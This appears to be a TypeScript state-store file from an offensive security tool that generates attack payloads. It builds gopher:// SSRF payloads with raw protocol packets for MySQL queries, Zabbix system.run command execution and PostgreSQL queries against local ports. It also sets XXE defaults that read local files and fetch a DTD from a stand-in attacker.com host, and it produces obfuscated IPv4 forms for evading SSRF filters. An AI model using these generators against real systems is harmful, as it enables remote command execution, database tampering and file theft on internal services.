import create from 'zustand';

export enum GopherPayload {
    MySQL = "MySQL | Require valid user with no authentication",
    Zabbix = "Zabbix ",
    // PostgreSQL = "PostgreSQL",
    // Custom = "Custom Raw TCP",
}

export enum XXETypes {
    OOB = "Out of Band",
    INBAND = "In Band",
}

type State = {
    payload: GopherPayload,
    XXEfilename: string,
    XXEtype: XXETypes,
    username: string,
    db: string,
    query: string,
    gopherLink: string,
    ipv4forObfuscation: string,
    obfuscatedIPv4: string[],
    setXXEfileName: ( XXEfilename ) => void,
    setXXEtype: ( XXEtype ) => void,
    XXEDTDPATH: string,
    setXXEDTDPath: ( XXEDTDPATH ) => void,
    REMOTEXXEServer: string,
    setREMOTEXXEServer: ( REMOTEXXEServer ) => void,
    setPayload: ( payload: GopherPayload ) => void,
    setUsername: ( username: string ) => void,
    setDb: ( db: string ) => void,  // added new setDb state function
    setQuery: ( query: string ) => void,
    setGopherLink: ( gopherLink: string ) => void,
    setIPv4forObfuscation: ( ipv4forObfuscation: string ) => void; // add setIPv4forObfuscation property
    generateMySQLGopherPayload: ( username: string, query: string ) => void,
    generateZabbixGopherPayload: ( command: string ) => void,
    generatePostgreSQLGopherPayload: ( username: string, db: string, query: string ) => void, // added new generatePostgreSQLGopherPayload state function
};

export const useStore = create<State>( ( set ) => ( {
    payload: GopherPayload.MySQL,
    username: "",
    XXEfilename: "" || "file:///etc/hostname",
    XXEtype: XXETypes.INBAND,
    db: "",  // set initial value of db to empty string
    query: "",
    gopherLink: "",
    ipv4forObfuscation: "" || "127.0.0.1",
    REMOTEXXEServer: "" || "http://attacker.com",
    setIPv4forObfuscation: ( ipv4forObfuscation ) => {
        set( { ipv4forObfuscation } );
        set( { obfuscatedIPv4: obfuscateIPv4( ipv4forObfuscation ) } );
    },
    setPayload: ( payload ) => set( { payload } ),
    setUsername: ( username ) => set( { username } ),
    setXXEfileName: ( evt ) => set( { XXEfilename: evt?.target.value } ),
    setXXEtype: ( XXEtype ) => set( { XXEtype } ),
    XXEDTDPATH: "" || "http://attacker.com/xxe.dtd",
    setXXEDTDPath: ( evt ) => set( { XXEDTDPATH: evt?.target.value } ),
    setREMOTEXXEServer: ( evt ) => set( { REMOTEXXEServer: evt?.target.value } ),
    setDb: ( db ) => set( { db } ),  // added new setDb state function
    setQuery: ( query ) => set( { query } ),
    obfuscatedIPv4: [],
    setGopherLink: ( gopherLink ) => set( { gopherLink } ),
    generateMySQLGopherPayload: ( username, query ) => {
        const payload = generateMySQLGopherPayload( username, query )
        set( { gopherLink: payload } );
    },
    generateZabbixGopherPayload: ( command ) => {
        const payload = generateZabbixGopherPayload( command )
        set( { gopherLink: payload } );
    },
    generatePostgreSQLGopherPayload: ( username, db, query ) => {
        const payload = generatePostgreSQLGopherPayload( username, db, query )
        set( { gopherLink: payload } );
    },
} ) );

function generateMySQLGopherPayload ( username: string, query: string ): string {
    const encoder = new TextEncoder();

    const encodeToHex = ( input: string ) => Array.from( encoder.encode( input ), byte => ( '0' + byte.toString( 16 ) ).slice( -2 ) ).join( '' );

    const usernameHex = encodeToHex( username );
    const userLength = username.length;
    const temp = userLength - 4;
    const length = ( 0xa3 + temp ).toString( 16 ).padStart( 2, '0' );

    let dump = length + "00000185a6ff0100000001210000000000000000000000000000000000000000000000";
    dump += usernameHex;
    dump += "00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c";
    dump += "69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d";
    dump += "067838365f36340c70726f6772616d5f6e616d65056d7973716c";

    const auth = dump.replace( "\n", "" );

    const encode = ( s: string ) => {
        const hexArray = s.match( /.{1,2}/g ) || [];
        return "gopher://127.0.0.1:3306/_%" + hexArray.join( '%' );
    }

    const getPayload = ( query: string ) => {
        if ( query.trim() !== '' ) {
            const queryHex = encodeToHex( query );
            const queryLength = ( queryHex.length / 2 + 1 ).toString( 16 ).padStart( 6, '0' );
            const queryLengthHex = Array.from( queryLength.match( /.{1,2}/g ) || [] ).reverse().join( '' );
            const pay1 = queryLengthHex + "0003" + queryHex;
            return encode( auth + pay1 + "0100000001" );
        } else {
            return encode( auth );
        }
    }

    return getPayload( query );
}


function generateZabbixGopherPayload ( command: string ): string {
    const encoder = new TextEncoder();

    const encodeToHex = ( input: string ) => Array.from( encoder.encode( input ), byte => ( '0' + byte.toString( 16 ) ).slice( -2 ) ).join( '' );
    const payload = `system.run[(${ command });sleep 2s]`;
    const payloadHex = encodeToHex( payload );

    const encode = ( s: string ) => {
        const hexArray = s.match( /.{1,2}/g ) || [];
        return "gopher://127.0.0.1:10050/_%" + hexArray.join( '%' );
    };
    return encode( payloadHex );
}
function generatePostgreSQLGopherPayload ( username: string, db: string, query: string ): string {
    // FIXME: Inconsistent Payload, need more debug
    const textEncoder = new TextEncoder();
    const encodeToHex = ( input: string ) =>
        Array.from( textEncoder.encode( input ), byte => ( '0' + byte.toString( 16 ) ).slice( -2 ) ).join( '' );
    const encodeUser = encodeToHex( username );
    const encodeDb = encodeToHex( db );
    const encodeQuery = encodeToHex( query );
    const lenQuery = textEncoder.encode( query ).length + 5;

    const start = "000000" + encodeToHex( String.fromCharCode( 4 + username.length + 8 + db.length + 13 ) ) + "000300";
    let data = "00" + encodeToHex( "user" ) + "00" + encodeUser + "00" + encodeToHex( "database" ) + "00" + encodeDb;
    data += "0000510000" + lenQuery.toString( 16 ).padStart( 4, '0' );
    data += encodeQuery;
    const end = "005800000004";

    const packet = start + data + end;

    const encode = ( s: string ) => {
        const hexArray = s.match( /.{1,2}/g ) || [];
        return "gopher://127.0.0.1:5432/_%" + hexArray.join( '%' );
    };

    return encode( packet );
}

function obfuscateIPv4 ( ip: string ): string[] {
    const regex = /^(\d{1,3}\.){3}\d{1,3}$/;
    if ( !regex.test( ip ) ) return [ 'Invalid IPv4' ]

    const dec = ip.split( '.' ).map( Number );
    const mutatedIPs = [];

    // @OsandaMalith/IPObfuscator project 
    mutatedIPs.push( `${ ( dec[ 0 ] << 24 | dec[ 1 ] << 16 | dec[ 2 ] << 8 | dec[ 3 ] ) >>> 0 }` );
    mutatedIPs.push( `${ dec.map( num => `0x${ num.toString( 16 ).padStart( 2, '0' ) }` ).join( '.' ) }` );
    mutatedIPs.push( `${ dec.map( num => num.toString( 8 ).padStart( 3, '0' ) ).join( '.' ) }` );
    mutatedIPs.push( `${ dec.map( num => `0x${ num.toString( 16 ).padStart( 10, '0' ) }` ).join( '.' ) }` );
    mutatedIPs.push( `${ dec.map( num => num.toString( 8 ).padStart( 10, '0' ) ).join( '.' ) }` );

    mutatedIPs.push( `${ dec.map( num => '0x' + num.toString( 16 ).padStart( 2, '0' ) ).join( '.' ) }` );
    mutatedIPs.push( `${ dec.slice( 0, 3 ).map( num => '0x' + num.toString( 16 ).padStart( 2, '0' ) ).join( '.' ) }.${ dec[ 3 ] }` );

    mutatedIPs.push( `${ dec.slice( 0, 3 ).map( num => num.toString( 8 ).padStart( 4, '0' ) ).join( '.' ) }.${ dec[ 3 ] }` );

    mutatedIPs.push( `0x${ dec[ 0 ].toString( 16 ).padStart( 2, '0' ) }.0x${ dec[ 1 ].toString( 16 ).padStart( 2, '0' ) }.${ ( dec[ 2 ] << 8 | dec[ 3 ] ) }` );

    mutatedIPs.push( `${ dec[ 0 ].toString( 8 ).padStart( 4, '0' ) }.${ dec[ 1 ].toString( 8 ).padStart( 4, '0' ) }.${ ( dec[ 2 ] << 8 | dec[ 3 ] ) }` );


    mutatedIPs.push( `${ dec.map( num => num.toString( 8 ).padStart( 4, '0' ) ).join( '.' ) }` );
    mutatedIPs.push( `${ dec.slice( 0, 2 ).map( num => `0x${ num.toString( 16 ).padStart( 2, '0' ) }` ).join( '.' ) }.${ dec.slice( 2 ).join( '.' ) }` );
    mutatedIPs.push( `${ dec.slice( 0, 2 ).map( num => num.toString( 8 ).padStart( 4, '0' ) ).join( '.' ) }.${ dec.slice( 2 ).join( '.' ) }` );
    mutatedIPs.push( `${ dec.slice( 0, 1 ).map( num => `0x${ num.toString( 16 ).padStart( 2, '0' ) }` ).join( '.' ) }.${ ( ( dec[ 1 ] << 8 | dec[ 2 ] ) << 8 | dec[ 3 ] ) >>> 0 }` );
    mutatedIPs.push( `${ dec[ 0 ].toString( 8 ).padStart( 4, '0' ) }.${ ( ( dec[ 1 ] << 8 | dec[ 2 ] ) << 8 | dec[ 3 ] ) >>> 0 }` );
    mutatedIPs.push( `${ dec.map( num => num.toString( 8 ).padStart( 4, '0' ) ).join( '.' ) }` );

    mutatedIPs.push( `${ dec.slice( 0, 1 ).map( num => `0x${ num.toString( 16 ).padStart( 2, '0' ) }` ).join( '.' ) }.${ ( ( dec[ 1 ] << 8 | dec[ 2 ] ) << 8 | dec[ 3 ] ) >>> 0 }` );

    mutatedIPs.push( `${ dec.slice( 0, 1 ).map( num => num.toString( 8 ).padStart( 4, '0' ) ).join( '.' ) }.${ ( ( dec[ 1 ] << 8 | dec[ 2 ] ) << 8 | dec[ 3 ] ) >>> 0 }` );
    return mutatedIPs;
}